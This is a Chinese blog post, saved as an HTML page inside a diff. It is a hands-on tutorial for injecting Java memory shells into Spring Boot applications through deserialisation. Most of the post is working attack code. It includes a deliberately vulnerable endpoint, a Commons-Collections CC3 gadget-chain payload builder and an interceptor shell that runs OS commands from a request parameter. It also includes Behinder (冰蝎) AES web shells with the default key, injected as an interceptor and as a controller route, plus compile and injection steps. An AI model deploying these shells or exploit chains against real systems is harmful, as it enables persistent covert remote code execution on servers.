@@ -1,0 +1,574 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>内存马小记 | 秋嘞个秋</title>
+<link rel="shortcut icon" href="https://sl3epf.github.io/favicon.ico?v=1710164223744">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://sl3epf.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="内存马小记 | 秋嘞个秋 - Atom Feed" href="https://sl3epf.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言
+记录一下利用CC链或者fastjson等打内存马的一些坑点，以及注入冰蝎的内存马。
+不是调试分析的文章（这个自己做本地差不多了，感觉网上大部分都差不多，不想搞得很大的篇幅，明白什么interceptor在哪里加入的，程序是如何到达c..." />
+    <meta name="keywords" content="Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://sl3epf.github.io">
+  <img class="avatar" src="https://sl3epf.github.io/images/avatar.png?v=1710164223744" alt="">
+  </a>
+  <h1 class="site-title">
+    秋嘞个秋
+  </h1>
+  <p class="site-description">
+    弃我去者，昨日之日不可留
+<br/>
+乱我心者，今日之日多烦忧
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              内存马小记
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-29
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://sl3epf.github.io/tag/_UMJ5ACaV/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h1 id="前言">前言</h1>
+<p>记录一下利用CC链或者fastjson等打内存马的一些坑点，以及注入冰蝎的内存马。<br>
+不是调试分析的文章（这个自己做本地差不多了，感觉网上大部分都差不多，不想搞得很大的篇幅，明白什么interceptor在哪里加入的，程序是如何到达controller层的，调用什么方法注册controller路由的等等。能看懂代码知道哪几行是获取什么，恶意类在那个地方注入的。)<br>
+做个记录方便以后操作。</p>
+<h1 id="环境">环境</h1>
+<p>方便起见直接用SpringBoot了</p>
+<pre><code class="language-java">  &lt;parent&gt;
+    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+    &lt;version&gt;2.4.5&lt;/version&gt;
+    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
+  &lt;/parent&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+      &lt;version&gt;3.2.1&lt;/version&gt;
+    &lt;/dependency&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
+    &lt;/dependency&gt;
+
+  &lt;/dependencies&gt;
+&lt;/project&gt;
+</code></pre>
+<p>漏洞点</p>
+<pre><code class="language-java">@RestController
+public class VulController {
+    @RequestMapping(&quot;/vul&quot;)
+    @ResponseBody
+    public String vul(HttpServletRequest request, HttpServletResponse response, String payload) throws IOException, ClassNotFoundException {
+        if (payload != null) {
+            System.out.println(payload);
+            byte[] decode = Base64.getDecoder().decode(payload);
+            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
+            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+            objectInputStream.readObject();
+            return &quot;attack success&quot;;
+        }
+        return &quot;payload null&quot;;
+    }
+}
+</code></pre>
+<h1 id="interceptor内存马利用">Interceptor内存马利用</h1>
+<h2 id="一-准备">一、准备</h2>
+<p>我们知道，将自定义的Interceptor类加入到RequestMappingHandlerMapping类的adaptedInterceptors属性中即可注册一个拦截器。<br>
+如下</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+import java.lang.reflect.Field;
+
+public class InterMemShell extends AbstractTranslet {
+    static {
+        try
+        {
+            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+            AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
+            Field field = null;
+
+            field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+
+            field.setAccessible(true);
+            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = null;
+
+            adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);
+
+            String className = &quot;magicInterceptor&quot;;
+            //加载magicInterceptor类的字节码
+            String b64 = &quot;base64 class&quot;;
+            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
+            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+            m0.setAccessible(true);
+            m0.invoke(classLoader, className, bytes, 0, bytes.length);
+            //添加com.example.spring.magicInterceptor类到adaptedInterceptors
+            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
+
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+
+
+    }
+
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>所以我们还需要一个类名为magicInterceptor(可以自定义，当然也要修改上面的className)的拦截器，重写preHandle方法。</p>
+<pre><code class="language-java">import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class magicInterceptor extends HandlerInterceptorAdapter{
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+       String code = request.getParameter(&quot;qiu&quot;);
+       if(code != null){
+           try {
+               java.io.PrintWriter writer = response.getWriter();
+               String o = &quot;&quot;;
+               ProcessBuilder p;
+               if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)){
+                   p = new ProcessBuilder(new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, code});
+               }else{
+                   p = new ProcessBuilder(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, code});
+               }
+               java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);
+               o = c.hasNext() ? c.next(): o;
+               c.close();
+               writer.write(o);
+               writer.flush();
+               writer.close();
+           }catch (Exception e){
+               e.printStackTrace();
+           }
+           return false;
+       }
+        return true;
+    }
+}
+</code></pre>
+<p>我这里利用CC3的LazyMap + TemplatesImpl链子打</p>
+<pre><code class="language-java">package Qiu;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templateClass = templates.getClass();
+        Field nameFiled = templateClass.getDeclaredField(&quot;_name&quot; );
+        nameFiled.setAccessible(true);
+        nameFiled.set(templates, &quot;qiuqiu&quot;);
+
+        Field bytecodesFiled = templateClass.getDeclaredField(&quot;_bytecodes&quot; );
+        bytecodesFiled.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;xxx.class&quot;));
+        byte[][] codes = {code};
+        bytecodesFiled.set(templates, codes);
+
+        Field _tfField = templateClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfField.setAccessible(true);
+        _tfField.set(templates, new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;, null, null)};
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object, Object&gt; Lazymap = LazyMap.decorate(map, chainedTransformer);
+
+        Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, Lazymap);
+
+        //一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。
+        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),// 传入ClassLoader
+                new Class[]{Map.class},// 传入要实现的接口
+                h);// 传入处理调用方法的InvocationHandler
+        Object o = constructor.newInstance(Override.class, maproxy);
+        serialize(o);
+        //unserialize(&quot;ser.bin&quot;);
+    }
+
+    public static void  serialize(Object obj) throws IOException {
+        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+</code></pre>
+<p>再准备一个Base64编码的工具类，因为后面肯定需要对字节码进行编码传输</p>
+<pre><code class="language-java">package Qiu;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class B64Evil {
+    public static void main(String[] args) throws IOException {
+        byte[] code1 = Files.readAllBytes(Paths.get(&quot;magicInterceptor.class&quot;));
+        System.out.println(Base64.getEncoder().encodeToString(code1));
+        byte[] code = Files.readAllBytes(Paths.get(&quot;ser.bin&quot;));
+        System.out.println(Base64.getEncoder().encodeToString(code));
+    }
+}
+</code></pre>
+<h2 id="二-编译利用">二、编译利用</h2>
+<p>接下来就需要进行编译恶意类了。<br>
+有些文章说直接用idea编译的，但是idea编译是会自带那个package包名的，如果有这个最后利用的时候会报.NoClassDefFoundError的错，我也不知道是怎么利用成功的。<br>
+所以就得用javac编译，如果直接<code>javac xxx.java</code>会报一堆的错误，因为是找不到依赖的，所以需要利用cp参数。<br>
+这里放出我的命令，这里的jar包我全部放在当前文件夹了。版本的话自行测试。</p>
+<pre><code class="language-shell">javac -cp .:spring-web-4.3.28.RELEASE.jar:spring-webmvc-4.3.28.RELEASE.jar:javax.servlet-api-3.1.0.jar:spring-context-4.3.28.RELEASE.jar:spring-beans-4.3.28.RELEASE.jar:spring-core-4.3.28.RELEASE.jar InterMemShell.java
+</code></pre>
+<p>首先编译好<code>magicInterceptor</code>（也就是你重写preHandle方法的🐎）<br>
+然后对class进行base64编码，放入<code>InterMemShell</code>中，然后用同样的命令对<code>InterMemShell</code>进行编译<br>
+接着利用CC3序列化成ser.bin文件，然后对它进行base64编码打入，发包的时候需要url编码<br>
+<img src="https://sl3epf.github.io/post-images/1703832466325.jpg" alt="" loading="lazy"></p>
+<h2 id="三-注入冰蝎内存马">三、注入冰蝎内存马</h2>
+<p>先看看冰蝎的🐎</p>
+<pre><code class="language-jsp">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
+    &lt;%!class U extends ClassLoader{
+        U(ClassLoader c){super(c);
+        }
+    public Class g(byte []b){
+        return super.defineClass(b,0,b.length);}
+    }%&gt;
+        &lt;%if (request.getMethod().equals(&quot;POST&quot;)){
+            String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+            session.putValue(&quot;u&quot;,k);
+            Cipher c=Cipher.getInstance(&quot;AES&quot;);
+            c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+            new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+        }
+        %&gt;
+</code></pre>
+<p>将之前的🐎替换为冰蝎的逻辑</p>
+<pre><code class="language-java">public class magicInterceptor extends HandlerInterceptorAdapter{
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        
+        HttpSession session = request.getSession();
+
+        HashMap pageContext = new HashMap();
+        pageContext.put(&quot;request&quot;,request);
+        pageContext.put(&quot;response&quot;,response);
+        pageContext.put(&quot;session&quot;,session);
+        try {
+            if (request.getMethod().equals(&quot;POST&quot;)) {
+                String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+                session.putValue(&quot;u&quot;,k);
+                Cipher c=Cipher.getInstance(&quot;AES&quot;);
+                c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+                Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                method.setAccessible(true);
+                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
+                evilclass.newInstance().equals(pageContext);
+            }
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+
+        return true;
+    }
+}
+</code></pre>
+<p>同样的方法进行编译注入<br>
+<img src="https://sl3epf.github.io/post-images/1703837004015.jpg" alt="" loading="lazy"></p>
+<h1 id="controller内存马利用">Controller内存马利用</h1>
+<p>冰蝎逻辑🐎子</p>
+<pre><code class="language-java">import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class magicController {
+        public void shell() throws Exception {
+            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
+            HttpSession session = request.getSession();
+            //create pageContext
+            HashMap pageContext = new HashMap();
+            pageContext.put(&quot;request&quot;,request);
+            pageContext.put(&quot;response&quot;,response);
+            pageContext.put(&quot;session&quot;,session);
+            try {
+                if (request.getMethod().equals(&quot;POST&quot;)) {
+                    String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+                    session.putValue(&quot;u&quot;,k);
+                    Cipher c=Cipher.getInstance(&quot;AES&quot;);
+                    c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+                    Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                    method.setAccessible(true);
+                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                    Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
+                    evilclass.newInstance().equals(pageContext);
+                }
+            } catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+}
+</code></pre>
+<p>注入恶意controller内存马</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import java.lang.reflect.Method;
+
+
+public class ConMemShell extends AbstractTranslet {
+    static {
+        try {
+            String className = &quot;magicController&quot;;
+            //加载magicController类的字节码
+            String b64 = &quot;b64&quot;;
+            byte[] d = new sun.misc.BASE64Decoder().decodeBuffer(b64);
+            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, new Class[]{String.class, byte[].class, int.class, int.class});
+            m.setAccessible(true);
+            m.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{className, d, 0, d.length});
+            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+            PatternsRequestCondition url = new PatternsRequestCondition(&quot;/qiu&quot;);
+            RequestMappingInfo info = new RequestMappingInfo(url, null, null, null, null, null, null);
+            RequestMappingHandlerMapping rs = context.getBean(RequestMappingHandlerMapping.class);
+            Method mm = Class.forName(className).getMethod(&quot;shell&quot;);
+            rs.registerMapping(info, Class.forName(className).newInstance(), mm);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+}
+</code></pre>
+<p>同样利用CC3打注入，成功连接<br>
+<img src="https://sl3epf.github.io/post-images/1703862511248.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a></li>
+<li><a href="#interceptor%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%A9%E7%94%A8">Interceptor内存马利用</a>
+<ul>
+<li><a href="#%E4%B8%80-%E5%87%86%E5%A4%87">一、准备</a></li>
+<li><a href="#%E4%BA%8C-%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8">二、编译利用</a></li>
+<li><a href="#%E4%B8%89-%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC">三、注入冰蝎内存马</a></li>
+</ul>
+</li>
+<li><a href="#controller%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%A9%E7%94%A8">Controller内存马利用</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://sl3epf.github.io/post/TRjx_WdgE/">
+              <h3 class="post-title">
+                [HZNUCTF 2023 final]ezjava
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Friends: <a href="https://zjackky.github.io/" target="_blank">zjackky</a>&nbsp;<a href="https://jaspersec.top/" target="_blank">jasper</a>&nbsp;<a href="https://zikh26.github.io/" target="_blank">zikh26</a>&nbsp;<a href="http://payioad.com/" target="_blank">payioad</a>&nbsp;
+<a href="http://blog.ldsecurity.cn/" target="_blank">凌度</a>&nbsp;<a href="http://www.aiwin.fun/" target="_blank">aiwin</a>&nbsp;
+  <a class="rss" href="https://sl3epf.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
